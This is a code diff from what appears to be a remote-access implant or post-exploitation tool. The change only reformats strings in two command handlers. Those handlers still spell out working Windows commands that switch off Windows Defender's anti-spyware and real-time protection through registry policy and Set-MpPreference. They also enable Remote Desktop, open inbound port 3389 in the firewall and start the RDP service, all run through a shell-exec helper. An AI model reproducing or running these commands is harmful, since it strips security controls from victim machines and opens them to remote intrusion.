@@ -2194,12 +2194,12 @@ def _disable_defender(conn, args: list[str]) -> str:
         return "[-] Windows Defender is Windows-only"
     results = []
     cmds = [
-        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" "
-        "/v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1",
-        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" "
-        "/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1",
-        "powershell -NoProfile -NonInteractive -Command "
-        "\"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>&1",
+        ("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\""
+         " /v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1"),
+        ("reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\""
+         " /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1"),
+        ("powershell -NoProfile -NonInteractive -Command"
+         " \"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>&1"),
     ]
     for cmd in cmds:
         r = _shell_exec(cmd)
@@ -2297,10 +2297,10 @@ def _rdp_enable(conn, args: list[str]) -> str:
         return "[-] RDP enable is Windows-only"
     results = []
     cmds = [
-        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" "
-        "/v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1",
-        "netsh advfirewall firewall add rule name=\"Allow RDP\" "
-        "protocol=TCP dir=in localport=3389 action=allow 2>&1",
+        ("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\""
+         " /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1"),
+        ("netsh advfirewall firewall add rule name=\"Allow RDP\""
+         " protocol=TCP dir=in localport=3389 action=allow 2>&1"),
         "net start TermService 2>&1",
     ]
     for cmd in cmds:
